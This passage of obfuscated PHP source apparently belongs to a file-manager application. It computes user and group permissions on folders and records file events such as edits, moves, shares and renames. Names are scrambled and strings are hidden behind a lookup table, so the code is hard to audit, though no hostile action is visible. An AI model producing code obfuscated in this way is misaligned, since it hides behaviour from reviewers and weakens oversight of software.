$´•í†¼Œ[$¤õ£á´Ş[87]][$¤õ£á´Ş[431]]; $³”ˆ£¨Î[$Å ˜‚ƒå] = $´•í†¼Œ[$¤õ£á´Ş[87]][$¤õ£á´Ş[431]]; $¹Î¿åŠ°[$Å ˜‚ƒå] = $°ÇÇãÎÍ->parentLevelArray($´•í†¼Œ[$¤õ£á´Ş[540]]); } foreach ($½õÀ»£ as $¢ ƒÓØô => $½Îô¦îö) { $¢–È†¢Ğ = $Ì‹‚±À‡[$¢ ƒÓØô]; if (!$¢–È†¢Ğ || !$³”ˆ£¨Î[$¢–È†¢Ğ]) { continue; } $´ÑÖÆÛ­ = array(); foreach ($¹Î¿åŠ°[$¢–È†¢Ğ] as $Å ˜‚ƒå) { $´ÑÖÆÛ­[] = $³”ˆ£¨Î[$Å ˜‚ƒå]; } $½õÀ»£[$¢ ƒÓØô] = array_merge($´ÑÖÆÛ­, $½Îô¦îö); } $ºúÏÁ„× = array_values(array_unique($ºúÏÁ„×)); $¯ë ƒ½’ = array($¤õ£á´Ş[2058] => $ºúÏÁ„×, $¤õ£á´Ş[2059] => $½õÀ»£); $ßªÆƒ¸Ì[$Ãö‚À³£] = $¯ë ƒ½’; return $¯ë ƒ½’; } private function makeSourceAuth($¯èÕı›ş, $çš¯¡¼, $¹ÍŠ•Æõ = false) { $ÜÅÂ…ªˆ =& $_SERVER[¹ş¤¶ĞÖ]; $ú×©—–± = $ÜÅÂ…ªˆ[88]; $‡¦ë¨Ğ = $¯èÕı›ş[$ÜÅÂ…ªˆ[525]]; $Ç»òÄ”£ = $¯èÕı›ş[$ÜÅÂ…ªˆ[440]] == SourceModel::TYPE_GROUP; $©Ö”ûç² = $Ç»òÄ”£ ? $this->groupRootAuth($‡¦ë¨Ğ, $¹ÍŠ•Æõ) : !1; if ($©Ö”ûç² && Model($ÜÅÂ…ªˆ[527])->authCheckAction($©Ö”ûç²[$ÜÅÂ…ªˆ[442]], $ÜÅÂ…ªˆ[1887])) { return $this->groupAuthInfo($©Ö”ûç², $‡¦ë¨Ğ); } $Úµ‰‡ˆÓ = Model($ÜÅÂ…ªˆ[1366])->parentLevelArray($¯èÕı›ş[$ÜÅÂ…ªˆ[540]]); $Úµ‰‡ˆÓ = array_merge(array($¯èÕı›ş[$ÜÅÂ…ªˆ[431]]), array_reverse($Úµ‰‡ˆÓ)); $ÎÛ’¸ø£ = !1; foreach ($Úµ‰‡ˆÓ as $ı·éå—Õ) { if (!isset($çš¯¡¼[$ı·éå—Õ])) { continue; } $êü‡ŸÚ” = $this->authMake($çš¯¡¼[$ı·éå—Õ], $¹ÍŠ•Æõ); if ($êü‡ŸÚ”[$ÜÅÂ…ªˆ[496]]) { $ÎÛ’¸ø£ = $êü‡ŸÚ”; break; } } if (!$Ç»òÄ”£) { return $ÎÛ’¸ø£; } if (!$ÎÛ’¸ø£ && $©Ö”ûç²) { $ÎÛ’¸ø£ = $this->groupAuthInfo($©Ö”ûç², $‡¦ë¨Ğ); } if (!$ÎÛ’¸ø£) { $ñ†‚ñğæ = Model($ÜÅÂ…ªˆ[541])->getInfo($‡¦ë¨Ğ); $áÓ¥Ï¬¤ = explode($ÜÅÂ…ªˆ[50], trim($ñ†‚ñğæ[$ÜÅÂ…ªˆ[540]], $ÜÅÂ…ªˆ[50])); $áÓ¥Ï¬¤ = array_reverse($áÓ¥Ï¬¤); foreach ($áÓ¥Ï¬¤ as $øˆóáâÜ) { if ($øˆóáâÜ == $ÜÅÂ…ªˆ[198] || $øˆóáâÜ == $ú×©—–±) { continue; } $ÄùÏ­“Ş = $this->groupRootAuth($øˆóáâÜ, $¹ÍŠ•Æõ); if (!$ÄùÏ­“Ş) { continue; } $ÎÛ’¸ø£ = $this->groupAuthInfo($ÄùÏ­“Ş, $øˆóáâÜ); break; } } if (!$ÎÛ’¸ø£ || $ÎÛ’¸ø£[$ÜÅÂ…ªˆ[443]] <= 0) { $“Çƒîù  = $this->authDeepCheck($¯èÕı›ş[$ÜÅÂ…ªˆ[431]], $¹ÍŠ•Æõ); if ($“Çƒîù ) { $ÎÛ’¸ø£ = $“Çƒîù ; } } return $ÎÛ’¸ø£; } private function userIsRoot($ãª†²ÃÒ = false) { $™ƒ¦… =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ãª†²ÃÒ && _get($GLOBALS, $™ƒ¦…[523])) { return !0; } $¸œÑƒÇ÷ = Model($™ƒ¦…[554])->getInfo($ãª†²ÃÒ); $³ü×ıçó = Model($™ƒ¦…[2067])->listData($¸œÑƒÇ÷[$™ƒ¦…[1555]]); if ($³ü×ıçó && $³ü×ıçó[$™ƒ¦…[531]][$™ƒ¦…[2068]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‚İö»ş¼) { $¨ú™å‡å =& $_SERVER[¹ş¤¶ĞÖ]; $«ü²¹ © = Model($¨ú™å‡å[1366]); $¼â·ÃÉÀ = $«ü²¹ ©->sourceInfo($‚İö»ş¼); if (!$¼â·ÃÉÀ) { return !1; } $«ü²¹ ©->groupPathDisplay($¼â·ÃÉÀ); $’Õ“»“ú = array($¼â·ÃÉÀ); $’Õ“»“ú = $«ü²¹ ©->_listAppendPath($’Õ“»“ú); $¼â·ÃÉÀ = $’Õ“»“ú[0]; $øùŸ„éÇ = $¼â·ÃÉÀ[$¨ú™å‡å[538]]; if (isset($¼â·ÃÉÀ[$¨ú™å‡å[546]])) { $ÏÁŠËı„ = explode($¨ú™å‡å[8], trim($¼â·ÃÉÀ[$¨ú™å‡å[538]], $¨ú™å‡å[8])); array_shift($ÏÁŠËı„); $øùŸ„éÇ = $¼â·ÃÉÀ[$¨ú™å‡å[544]] . $¨ú™å‡å[2069] . implode($¨ú™å‡å[8], $ÏÁŠËı„); } return array($¨ú™å‡å[449] => $¼â·ÃÉÀ[$¨ú™å‡å[32]], $¨ú™å‡å[84] => KodIO::make($¼â·ÃÉÀ[$¨ú™å‡å[431]]), $¨ú™å‡å[2070] => $øùŸ„éÇ); } private function groupAuthInfo($ÁÂ°¤ç, $Ğò¦ÇÙï) { $ñ†˜ëÅ¿ =& $_SERVER[¹ş¤¶ĞÖ]; $åÒûÙ¶¦ = Model($ñ†˜ëÅ¿[541])->getInfo($Ğò¦ÇÙï); return array($ñ†˜ëÅ¿[2071] => intval($ÁÂ°¤ç[$ñ†˜ëÅ¿[442]]), $ñ†˜ëÅ¿[2055] => $ÁÂ°¤ç, $ñ†˜ëÅ¿[2072] => LNG($ñ†˜ëÅ¿[2073]), $ñ†˜ëÅ¿[2064] => array($ñ†˜ëÅ¿[449] => $åÒûÙ¶¦[$ñ†˜ëÅ¿[32]], $ñ†˜ëÅ¿[84] => KodIO::make($åÒûÙ¶¦[$ñ†˜ëÅ¿[87]][$ñ†˜ëÅ¿[431]]), $ñ†˜ëÅ¿[2070] => $åÒûÙ¶¦[$ñ†˜ëÅ¿[545]])); } protected function groupRootAuth($®éŒü¸, $¸öÃòÅ« = false) { $†ºî¶à =& $_SERVER[¹ş¤¶ĞÖ]; $¸öÃòÅ« = $¸öÃòÅ« ? $¸öÃòÅ« : USER_ID; $íÔˆé‚Í = $¸öÃòÅ« . $†ºî¶à[2074] . $®éŒü¸; static $œ¬˜Ÿ« = array(); if (isset($œ¬˜Ÿ«[$íÔˆé‚Í])) { return $œ¬˜Ÿ«[$íÔˆé‚Í]; } $ß·äáÅ• = Model($†ºî¶à[541])->getInfo($®éŒü¸); $ÉßÁ½¥™ = $this->userGroupList($¸öÃòÅ«); $úá½Ñ•“ = isset($ÉßÁ½¥™[$®éŒü¸]) ? $ÉßÁ½¥™[$®éŒü¸][$†ºî¶à[442]] : !1; if ($úá½Ñ•“ && Model($†ºî¶à[527])->authCheckAction($úá½Ñ•“[$†ºî¶à[442]], $†ºî¶à[1887])) { $œ¬˜Ÿ«[$íÔˆé‚Í] = $úá½Ñ•“; return $úá½Ñ•“; } $¬Í´İï = $this->sourceAuthSelect($ß·äáÅ•[$†ºî¶à[87]][$†ºî¶à[431]]); $ µâá† = $¬Í´İï ? $this->authMake($¬Í´İï, $¸öÃòÅ«) : !1; $Ä…Åá°« = $ µâá† ? $ µâá†[$†ºî¶à[496]] : !1; $œ¬˜Ÿ«[$íÔˆé‚Í] = $Ä…Åá°« ? $Ä…Åá°« : $úá½Ñ•“; return $œ¬˜Ÿ«[$íÔˆé‚Í]; } public function authOwnerApply($»™æÌ“) { $ÍÔ”îµ† =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($»™æÌ“[$ÍÔ”îµ†[442]]) || isset($»™æÌ“[$ÍÔ”îµ†[2075]]) && $»™æÌ“[$ÍÔ”îµ†[2075]]) { return $»™æÌ“; } if (AuthModel::authCheckRoot($»™æÌ“[$ÍÔ”îµ†[442]][$ÍÔ”îµ†[443]])) { return $»™æÌ“; } $Ï«òÚ¦Ğ = Model($ÍÔ”îµ†[1366])->parentLevelArray($»™æÌ“[$ÍÔ”îµ†[540]]); $Ï«òÚ¦Ğ = array_merge(array($»™æÌ“[$ÍÔ”îµ†[431]]), array_reverse($Ï«òÚ¦Ğ)); $÷‚çûàÈ = $this->sourceAuthSelect($Ï«òÚ¦Ğ); $³úÍ¡¥ = array(); $÷ŠÊêûÏ = array(); foreach ($÷‚çûàÈ as $½â™‹Ùß => $Öäµïµ½) { $ïµ¢Î» = $this->authFolderOwnerUser($Öäµïµ½); $³úÍ¡¥[$½â™‹Ùß] = $ïµ¢Î»; $÷ŠÊêûÏ = array_merge($÷ŠÊêûÏ, $ïµ¢Î»[$ÍÔ”îµ†[619]]); if ($ïµ¢Î»[$ÍÔ”îµ†[2076]]) { break; } } if (count($÷ŠÊêûÏ) == 0) { $÷ŠÊêûÏ = $this->authFolderOwnerGroup($»™æÌ“[$ÍÔ”îµ†[525]]); } $÷ŠÊêûÏ = array_unique($÷ŠÊêûÏ); if (AuthModel::authCheckRoot($»™æÌ“[$ÍÔ”îµ†[442]][$ÍÔ”îµ†[443]])) { $÷ŠÊêûÏ[] = USER_ID; } $»™æÌ“[$ÍÔ”îµ†[442]][$ÍÔ”îµ†[2077]] = Model($ÍÔ”îµ†[533])->userListInfo($÷ŠÊêûÏ); return $»™æÌ“; } private function authFolderOwnerGroup($««·ÁÇˆ) { $ñÚÁ´Šß =& $_SERVER[¹ş¤¶ĞÖ]; $ù ²Ü£¶ = Model($ñÚÁ´Šß[1956])->where(array($ñÚÁ´Šß[1866] => $««·ÁÇˆ))->select(); $´‚Ã¯ƒ = array(); if (!$ù ²Ü£¶) { return $´‚Ã¯ƒ; } foreach ($ù ²Ü£¶ as $—ÏæÑöÔ) { $³÷äõ” = $this->authInfo($—ÏæÑöÔ); if (AuthModel::authCheckRoot($³÷äõ”[$ñÚÁ´Šß[442]])) { $´‚Ã¯ƒ[] = $—ÏæÑöÔ[$ñÚÁ´Šß[1676]]; } } return $´‚Ã¯ƒ; } private function authFolderOwnerUser($ğ–­¸Ò) { $Š²³ŸŠ„ =& $_SERVER[¹ş¤¶ĞÖ]; $³õê¶Î = array(); $‡Íºğœ = !1; foreach ($ğ–­¸Ò as $€í¡‡ à) { $ÄµÏÌë¡ = $this->authInfo($€í¡‡ à); if ($€í¡‡ à[$Š²³ŸŠ„[525]] == $Š²³ŸŠ„[198]) { $‡Íºğœ = !0; } if ($€í¡‡ à[$Š²³ŸŠ„[440]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÄµÏÌë¡[$Š²³ŸŠ„[442]])) { $³õê¶Î[] = $€í¡‡ à[$Š²³ŸŠ„[525]]; } } } return array($Š²³ŸŠ„[619] => $³õê¶Î, $Š²³ŸŠ„[2076] => $‡Íºğœ); } public function authMake($‹›ÚÓˆı, $íé´ÂïŞ = false) { $ƒÓ”›ú¿ =& $_SERVER[¹ş¤¶ĞÖ]; $§Ï³ÜÍ¨ = $this->authArrayCheck($‹›ÚÓˆı, $íé´ÂïŞ); if ($§Ï³ÜÍ¨[$ƒÓ”›ú¿[2078]]) { $§Ï³ÜÍ¨[$ƒÓ”›ú¿[2078]] = $this->sourceAuthInfo($§Ï³ÜÍ¨[$ƒÓ”›ú¿[2078]]); } return $§Ï³ÜÍ¨; } public function authArrayCheck($ÁŞ‰Ñ ¤, $—Ø”Ó = false) { $òî¶¹¤‘ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ÁŞ‰Ñ ¤) { return array($òî¶¹¤‘[443] => 0, $òî¶¹¤‘[496] => !1); } $—Ø”Ó = $—Ø”Ó ? $—Ø”Ó : USER_ID; $°ÊíòĞÆ = 0; $–ÎÔ‘“ = 0; $Ù½›àú = 0; $±ÎÛ»¡ = 0; $ıİÀ‚œŒ = 0; $ãøˆ ı = 0; $¶ğ­¦ş¥ = 1000; $‹êçñëÆ = 0; $÷ò¶ûƒü = 0; $ü­Ü¶íÅ = 0; $Èüï‚ñ„ = 0; $“ğ­í = array($òî¶¹¤‘[431] => 0); foreach ($ÁŞ‰Ñ ¤ as $“ğ­í) { $©×¦ãüÏ = $this->authInfo($“ğ­í); if (!$©×¦ãüÏ) { continue; } $ÔÄø×š˜ = $“ğ­í[$òî¶¹¤‘[525]]; $¥ğƒĞïœ = intval($©×¦ãüÏ[$òî¶¹¤‘[442]]); if ($“ğ­í[$òî¶¹¤‘[440]] == SourceModel::TYPE_USER && $ÔÄø×š˜ == $—Ø”Ó) { $°ÊíòĞÆ = !0; $Ù½›àú = $©×¦ãüÏ; $–ÎÔ‘“ = $¥ğƒĞïœ; } else { if ($“ğ­í[$òî¶¹¤‘[440]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÔÄø×š˜, $—Ø”Ó)) { $±ÎÛ»¡ = !0; $Ó÷æùˆ¦ = $this->groupStepToUserGroup($ÔÄø×š˜, $—Ø”Ó); if ($Ó÷æùˆ¦ < $¶ğ­¦ş¥) { $¶ğ­¦ş¥ = $Ó÷æùˆ¦; $ıİÀ‚œŒ = $¥ğƒĞïœ; $ãøˆ ı = $©×¦ãüÏ; $‹êçñëÆ = $ÔÄø×š˜; } if ($Ó÷æùˆ¦ == $¶ğ­¦ş¥ && $¥ğƒĞïœ >= $ıİÀ‚œŒ) { $ıİÀ‚œŒ = $¥ğƒĞïœ; $ãøˆ ı = $©×¦ãüÏ; $‹êçñëÆ = $ÔÄø×š˜; } } else { if ($ÔÄø×š˜ == $òî¶¹¤‘[198]) { $÷ò¶ûƒü = !0; $Èüï‚ñ„ = $©×¦ãüÏ; $ü­Ü¶íÅ = $¥ğƒĞïœ; } } } } if ($°ÊíòĞÆ) { $²­ó³ğ¼ = $–ÎÔ‘“; $©×¦ãüÏ = $Ù½›àú; $”òÄÖô› = LNG($òî¶¹¤‘[2079]); } else { if ($±ÎÛ»¡) { $²­ó³ğ¼ = $ıİÀ‚œŒ; $©×¦ãüÏ = $ãøˆ ı; $é™¹İö = Model($òî¶¹¤‘[541])->getInfo($‹êçñëÆ); $”òÄÖô› = $òî¶¹¤‘[162] . $é™¹İö[$òî¶¹¤‘[545]] . $òî¶¹¤‘[2080] . LNG($òî¶¹¤‘[2081]); } else { if ($÷ò¶ûƒü) { $²­ó³ğ¼ = $ü­Ü¶íÅ; $©×¦ãüÏ = $Èüï‚ñ„; $”òÄÖô› = LNG($òî¶¹¤‘[2052]); } else { $²­ó³ğ¼ = 0; $©×¦ãüÏ = !1; $”òÄÖô› = $òî¶¹¤‘[12]; } } } $Ï¾Î×‹Ç = array($òî¶¹¤‘[2071] => intval($²­ó³ğ¼), $òî¶¹¤‘[2055] => $©×¦ãüÏ, $òî¶¹¤‘[2072] => $”òÄÖô›, $òî¶¹¤‘[2064] => $“ğ­í[$òî¶¹¤‘[431]]); return $Ï¾Î×‹Ç; } private function groupContainUser($åŞ…ñÕ¼, $ÈúÍòŠ = false) { return in_array($åŞ…ñÕ¼, $this->userGroupParents($ÈúÍòŠ)); } private function groupStepToUserGroup($î³İö¶í, $›·ô˜ ® = false) { $ «Ö¶Úò =& $_SERVER[¹ş¤¶ĞÖ]; $îõëßÀš = $this->userGroupList($›·ô˜ ®); $®¬º÷€‰ = 1000; $×€¼ø = $GLOBALS[$ «Ö¶Úò[6]][$ «Ö¶Úò[89]][$ «Ö¶Úò[1969]] == 1; $â¾”æáÅ = $×€¼ø ? 3 : 2; foreach ($îõëßÀš as $Àè¯ñÁÎ) { if ($Àè¯ñÁÎ[$ «Ö¶Úò[1866]] == $î³İö¶í) { return 0; } $íÚËÑ = explode($ «Ö¶Úò[50], trim($Àè¯ñÁÎ[$ «Ö¶Úò[540]], $ «Ö¶Úò[50])); if ($íÚËÑ[0] == $ «Ö¶Úò[198] && count($íÚËÑ) > $â¾”æáÅ) { $Ã²şğã = array_reverse(array_slice($íÚËÑ, $â¾”æáÅ)); $ãÓã†È = array_search($î³İö¶í, $Ã²şğã); if ($ãÓã†È !== !1 && $ãÓã†È + 1 <= $®¬º÷€‰) { $®¬º÷€‰ = $ãÓã†È + 1; } } } return $®¬º÷€‰; } private function userGroupList($ÌíÃæÑ½ = false) { $³ûâ†´ã =& $_SERVER[¹ş¤¶ĞÖ]; static $‘€á–² = array(); if (isset($‘€á–²[$ÌíÃæÑ½])) { return $‘€á–²[$ÌíÃæÑ½]; } $ÇüÑ½×Â = Model($³ûâ†´ã[554])->getInfo($ÌíÃæÑ½); $‘€á–²[$ÌíÃæÑ½] = array_to_keyvalue($ÇüÑ½×Â[$³ûâ†´ã[2053]], $³ûâ†´ã[1866]); return $‘€á–²[$ÌíÃæÑ½]; } public function userGroupParents($Àï»ÁË×) { $ò•›ä’Ê =& $_SERVER[¹ş¤¶ĞÖ]; static $ôú¡‰Õ = array(); $Àï»ÁË× = $Àï»ÁË× ? $Àï»ÁË× : USER_ID; if (isset($ôú¡‰Õ[$Àï»ÁË×])) { return $ôú¡‰Õ[$Àï»ÁË×]; } $Í—’»Ãİ = $this->userGroupList($Àï»ÁË×); $ÉÓúÜô’ = array(); $—Ó¤Ã•ñ = $GLOBALS[$ò•›ä’Ê[6]][$ò•›ä’Ê[89]][$ò•›ä’Ê[1969]] == 1; $š¿ğÉ‡ë = $—Ó¤Ã•ñ ? 3 : 2; foreach ($Í—’»Ãİ as $ÀåÜôá’) { $ÖºÃÉÊà = array($ÀåÜôá’[$ò•›ä’Ê[1866]]); $ôèŠ´¯ô = explode($ò•›ä’Ê[50], trim($ÀåÜôá’[$ò•›ä’Ê[540]], $ò•›ä’Ê[50])); if ($ôèŠ´¯ô[0] == $ò•›ä’Ê[198] && count($ôèŠ´¯ô) > $š¿ğÉ‡ë) { $ú’íã‡ô = array_slice($ôèŠ´¯ô, $š¿ğÉ‡ë); $ÖºÃÉÊà = array_merge($ÖºÃÉÊà, array_reverse($ú’íã‡ô)); } $ÉÓúÜô’ = array_merge($ÉÓúÜô’, $ÖºÃÉÊà); } $ôú¡‰Õ[$Àï»ÁË×] = array_unique($ÉÓúÜô’); return $ôú¡‰Õ[$Àï»ÁË×]; } public function authTargetInfoMake($éåµşÅƒ) { $Ñà«å½Ç =& $_SERVER[¹ş¤¶ĞÖ]; $Ó£ÌÃ¢š = array(); $¡÷„Ÿèä = array(); foreach ($éåµşÅƒ as $€§«°•é) { if ($€§«°•é[$Ñà«å½Ç[440]] == SourceModel::TYPE_USER) { $Ó£ÌÃ¢š[] = intval($€§«°•é[$Ñà«å½Ç[525]]); } else { if ($€§«°•é[$Ñà«å½Ç[440]] == SourceModel::TYPE_GROUP) { $¡÷„Ÿèä[] = intval($€§«°•é[$Ñà«å½Ç[525]]); } } } if ($Ó£ÌÃ¢š) { $Ó£ÌÃ¢š = Model($Ñà«å½Ç[533])->userListInfo($Ó£ÌÃ¢š); } if ($¡÷„Ÿèä) { $“™†Ş“Æ = array($Ñà«å½Ç[1954] => array($Ñà«å½Ç[447], $¡÷„Ÿèä)); $¡÷„Ÿèä = Model($Ñà«å½Ç[541])->field($Ñà«å½Ç[2082])->where($“™†Ş“Æ)->select(); $¡÷„Ÿèä = array_to_keyvalue($¡÷„Ÿèä, $Ñà«å½Ç[1866]); } return array($Ñà«å½Ç[2083] => $Ó£ÌÃ¢š, $Ñà«å½Ç[2084] => $¡÷„Ÿèä); } public function authInfo($Š‰êÅ) { $í²‚§ß÷ =& $_SERVER[¹ş¤¶ĞÖ]; if ($Š‰êÅ[$í²‚§ß÷[1970]]) { $ëˆÉØï¹ = Model($í²‚§ß÷[527])->listData($Š‰êÅ[$í²‚§ß÷[1970]]); if (!$ëˆÉØï¹) { return !1; $Äæ†§Š = Model($í²‚§ß÷[527])->listData(); $ÜÄëˆÀŒ = array_filter_by_field($Äæ†§Š, $í²‚§ß÷[442], $í²‚§ß÷[198]); return $ÜÄëˆÀŒ; } $ÚıˆÉÄÑ = array_field_key($ëˆÉØï¹, array($í²‚§ß÷[428], $í²‚§ß÷[32], $í²‚§ß÷[442], $í²‚§ß÷[1889], $í²‚§ß÷[1890])); $ÚıˆÉÄÑ[$í²‚§ß÷[2085]] = $Š‰êÅ; return $ÚıˆÉÄÑ; } else { return array($í²‚§ß÷[448] => 0, $í²‚§ß÷[1872] => $Š‰êÅ[$í²‚§ß÷[2030]], $í²‚§ß÷[449] => $í²‚§ß÷[12], $í²‚§ß÷[1889] => $í²‚§ß÷[2086]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65\x5f\145\166\145\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\145\162\164", "\146\165\156\x63\164\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\151\156\163\145\x72\x74\x2c\165\x70\144\x61\164\145\x2c\163\145\x6c\145\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($‡×“ú¦², $Íìû»œ, $‹ï¯×Ó = '') { $ù•—Œ¬‹ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->eventSave) { return; } $Îº•ÜÔ = Model($ù•—Œ¬‹[1366])->sourceInfo($‡×“ú¦²); if (!$Îº•ÜÔ) { return !1; } if ($this->isCacheEvent($Îº•ÜÔ, $Íìû»œ)) { return; } if ($‹ï¯×Ó && is_string($‹ï¯×Ó)) { $‹ï¯×Ó = array($ù•—Œ¬‹[1905] => $‹ï¯×Ó); } $éë§ª = defined($ù•—Œ¬‹[2087]) ? USER_ID : 0; $‹®–¸õ› = array($ù•—Œ¬‹[446] => $‡×“ú¦², $ù•—Œ¬‹[2088] => $Îº•ÜÔ[$ù•—Œ¬‹[461]], $ù•—Œ¬‹[2089] => $Îº•ÜÔ[$ù•—Œ¬‹[32]], $ù•—Œ¬‹[538] => !empty($Îº•ÜÔ[$ù•—Œ¬‹[538]]) ? $Îº•ÜÔ[$ù•—Œ¬‹[538]] : $ù•—Œ¬‹[12], $ù•—Œ¬‹[1667] => $éë§ª, $ù•—Œ¬‹[451] => $Íìû»œ, $ù•—Œ¬‹[1669] => $‹ï¯×Ó); $this->addSystemLog($Íìû»œ, $‹®–¸õ›); unset($‹®–¸õ›[$ù•—Œ¬‹[2089]], $‹®–¸õ›[$ù•—Œ¬‹[538]]); return $this->add($‹®–¸õ›); } private function addSystemLog($ÇİĞ¡ˆ‚, $Ñ‚¡Àéö) { $± ­Ä¥ì =& $_SERVER[¹ş¤¶ĞÖ]; if ($ÇİĞ¡ˆ‚ == $± ­Ä¥ì[2090]) { $ÇİĞ¡ˆ‚ = $Ñ‚¡Àéö[$± ­Ä¥ì[482]][$± ­Ä¥ì[2091]]; } else { if (in_array($ÇİĞ¡ˆ‚, array($± ­Ä¥ì[1846], $± ­Ä¥ì[2092]))) { $ÇİĞ¡ˆ‚ = $Ñ‚¡Àéö[$± ­Ä¥ì[482]][$± ­Ä¥ì[780]]; } } $İù‚…¾Î = array_merge($Ñ‚¡Àéö, array($± ­Ä¥ì[2093] => $Ñ‚¡Àéö[$± ­Ä¥ì[431]], $± ­Ä¥ì[2094] => $Ñ‚¡Àéö[$± ­Ä¥ì[2094]])); Hook::trigger($± ­Ä¥ì[2095], $± ­Ä¥ì[2096] . $ÇİĞ¡ˆ‚, $Ñ‚¡Àéö); Model($± ­Ä¥ì[1810])->addLog($± ­Ä¥ì[2096] . $ÇİĞ¡ˆ‚, $İù‚…¾Î); } private function isCacheEvent($¨›Û¹øÓ, $£ó•œ×è) { if ($¨›Û¹øÓ[$_SERVER[¹ş¤¶ĞÖ][440]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($²Ï×âñÕ, $ÔŠÙĞÓÆ) { $¦ »Ú‚ =& $_SERVER[¹ş¤¶ĞÖ]; $ÕâÈ“‰ê = Model($¦ »Ú‚[1366])->sourceInfo($²Ï×âñÕ); $‹ë¥°˜ƒ = array($¦ »Ú‚[2091] => $ÔŠÙĞÓÆ, $¦ »Ú‚[32] => $ÕâÈ“‰ê[$¦ »Ú‚[32]]); return $this->addEvent($²Ï×âñÕ, $¦ »Ú‚[2090], $‹ë¥°˜ƒ); } public function eventFileEdit($ò˜¸µàˆ) { $ÊºÕûüÜ =& $_SERVER[¹ş¤¶ĞÖ]; $ç¨êñÏŠ = array($ÊºÕûüÜ[2097] => $_SERVER[$ÊºÕûüÜ[2098]], $ÊºÕûüÜ[2099] => strtolower(ACTION)); if (isset($GLOBALS[$ÊºÕûüÜ[7]][$ÊºÕûüÜ[2100]])) { $ç¨êñÏŠ[$ÊºÕûüÜ[2100]] = $ÊºÕûüÜ[88]; } return $this->addEvent($ò˜¸µàˆ, $ÊºÕûüÜ[1836], $ç¨êñÏŠ); } public function eventRecycle($ÁÑŞÓíà, $ÒÉô÷Ç¿) { return $this->addEvent($ÁÑŞÓíà, $_SERVER[¹ş¤¶ĞÖ][2092], $ÒÉô÷Ç¿); } public function eventRemove($ó¾´ò¾º) { $øÈ¿ÌÀò =& $_SERVER[¹ş¤¶ĞÖ]; $âÉ…øÌ = Model($øÈ¿ÌÀò[1366])->sourceInfo($ó¾´ò¾º); $“ËŒ©Åª = $âÉ…øÌ[$øÈ¿ÌÀò[32]]; return $this->addEvent($âÉ…øÌ[$øÈ¿ÌÀò[461]], $øÈ¿ÌÀò[1835], $“ËŒ©Åª); } public function eventShare($¿çòòâÆ, $»å÷şşœ) { return $this->addEvent($¿çòòâÆ, $_SERVER[¹ş¤¶ĞÖ][1846], $»å÷şşœ); } public function eventMove($µíÕúªÖ, $í¾ùÍ‹, $ü­¦É‰õ) { $Ô÷ä©³³ =& $_SERVER[¹ş¤¶ĞÖ]; $ª¶–¿™Õ = Model($Ô÷ä©³³[1366]); $ïşøıç = $ª¶–¿™Õ->sourceInfo($µíÕúªÖ); $îéöí– = $ª¶–¿™Õ->sourceInfo($í¾ùÍ‹); $ÕÓ£§²¼ = $ª¶–¿™Õ->sourceInfo($ü­¦É‰õ); $¾‘ªàı– = array($Ô÷ä©³³[1193] => $í¾ùÍ‹, $Ô÷ä©³³[2101] => $îéöí–[$Ô÷ä©³³[32]], $Ô÷ä©³³[2078] => !empty($îéöí–[$Ô÷ä©³³[538]]) ? $îéöí–[$Ô÷ä©³³[538]] : $Ô÷ä©³³[12], $Ô÷ä©³³[1194] => $ü­¦É‰õ, $Ô÷ä©³³[2102] => $ÕÓ£§²¼[$Ô÷ä©³³[32]], $Ô÷ä©³³[2103] => !empty($ÕÓ£§²¼[$Ô÷ä©³³[538]]) ? $ÕÓ£§²¼[$Ô÷ä©³³[538]] : $Ô÷ä©³³[12]); $this->addEvent($µíÕúªÖ, $Ô÷ä©³³[577], $¾‘ªàı–); $ïşøıç = $ª¶–¿™Õ->sourceInfo($µíÕúªÖ); $¾‘ªàı– = array($Ô÷ä©³³[431] => $ïşøıç[$Ô÷ä©³³[431]], $Ô÷ä©³³[32] => $ïşøıç[$Ô÷ä©³³[32]]); $this->addEvent($í¾ùÍ‹, $Ô÷ä©³³[2104], $¾‘ªàı–); } public function eventCopy($œÀõÌÓî) { $this->eventCreate($œÀõÌÓî, $_SERVER[¹ş¤¶ĞÖ][575]); } public function eventRename($İé·½Ï¾, $Î–¢°ö¯, $ÔƒƒÄ­) { $ÛÇèÔ«À =& $_SERVER[¹ş¤¶ĞÖ]; $¦íİÍ±Â = array($ÛÇèÔ«À[1193] => $Î–¢°ö¯, $ÛÇèÔ«À[1194] => $ÔƒƒÄ­); return $this->addEvent($İé·½Ï¾, $ÛÇèÔ«À[1381], $¦íİÍ±Â); } public function eventAddComment($÷‡±‹ô‡, $›Èïˆ™) { return $this->addEvent($÷‡±‹ô‡, $_SERVER[¹ş¤¶ĞÖ][2105], $›Èïˆ™); } public function eventAddDesc($ú¬›°“, $ƒÒÍøàÈ) { return $this->addEvent($ú¬›°“, $_SERVER[¹ş¤¶ĞÖ][2106], $ƒÒÍøàÈ); } public function listBySource($Œ°ˆ¹¨Ÿ) { $˜Àïï =& $_SERVER[¹ş¤¶ĞÖ]; $ò®İøŞÍ = Model($˜Àïï[1366])->sourceInfo($Œ°ˆ¹¨Ÿ); $Ù¤ìë¯§ = array($˜Àïï[446] => $Œ°ˆ¹¨Ÿ); if ($ò®İøŞÍ[$˜Àïï[439]] == $˜Àïï[88]) { $ôÛõàŞÅ = Model($˜Àïï[1366])->listSearchChildren($Œ°ˆ¹¨Ÿ, 20000); $ôÛõàŞÅ[] = $Œ°ˆ¹¨Ÿ . $˜Àïï[407]; $Ù¤ìë¯§ = array($˜Àïï[431] => array($˜Àïï[7], $ôÛõàŞÅ)); } $©Æ›ØŸÖ = $this->where($Ù¤ìë¯§)->order($˜Àïï[2107])->selectPage(); if ($©Æ›ØŸÖ[$˜Àïï[395]][$˜Àïï[396]] == 0) { 